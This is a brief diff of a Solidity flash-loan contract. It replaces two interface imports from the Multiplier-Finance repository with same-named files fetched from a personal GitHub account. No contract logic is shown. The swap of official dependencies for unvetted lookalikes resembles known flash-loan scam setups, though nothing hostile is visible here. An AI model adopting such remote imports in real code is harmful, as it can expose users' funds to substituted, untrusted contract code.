@@ -16,8 +16,8 @@ import "https://github.com/vvs-finance/vvs-swap-core/blob/master/contracts/inter
 import "https://github.com/satsaftersats/Flashloan-Contracts/blob/main/CroRouter.sol";
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "https://github.com/satsaftersats/FlashLoanInterface/blob/main/ILendingPoolProvider.sol";
+import "https://github.com/satsaftersats/FlashLoanInterface/blob/main/ILendingPool.sol";
 
 
 
